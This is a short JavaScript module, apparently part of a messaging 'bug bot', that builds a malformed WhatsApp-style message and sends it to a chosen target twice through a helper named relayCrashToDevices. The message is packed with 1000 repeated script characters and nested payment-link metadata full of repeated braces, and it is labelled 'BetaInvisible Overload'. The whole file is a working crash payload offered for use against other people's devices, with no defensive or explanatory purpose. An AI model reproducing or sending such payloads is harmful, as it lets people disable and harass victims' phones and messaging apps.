const { relayCrashToDevices } = require('../target-utils');

async function xbetainvis(SYxS7, target) {
    const msg = {
        extendedTextMessage: {
            text: ". xbetainvis " + "ꦾ".repeat(1000),
            matchedText: "https://t.me/devor6core",
            description: "BetaInvisible Overload",
            title: "BetaInvisible",
            paymentLinkMetadata: {
                button: { displayText: "PAY" },
                header: { headerType: 1 },
                provider: { paramsJson: JSON.stringify({ code: "{{".repeat(200) }) }
            },
            linkPreviewMetadata: {
                paymentLinkMetadata: {
                    button: { displayText: "PAY" },
                    header: { headerType: 1 },
                    provider: { paramsJson: JSON.stringify({ code: "{{".repeat(200) }) }
                },
                urlMetadata: { fbExperimentId: 999 },
                fbExperimentId: 888,
                linkMediaDuration: 555,
                socialMediaPostType: 1221
            }
        }
    };

    try {
        const r1 = await relayCrashToDevices(SYxS7, target, {
            groupStatusMessageV2: {
                message: msg
            }
        });
        const r2 = await relayCrashToDevices(SYxS7, target, msg);
        return {
            success: r1.success || r2.success,
            deliveredCount: r1.deliveredCount + r2.deliveredCount,
            errors: [...r1.errors, ...r2.errors]
        };
    } catch (error) {
        console.log(`[ 🗑️ ] Error on xbetainvis message: ${error.message}`);
        return { success: false, deliveredCount: 0, errors: [error.message] };
    }
}

module.exports = { xbetainvis };
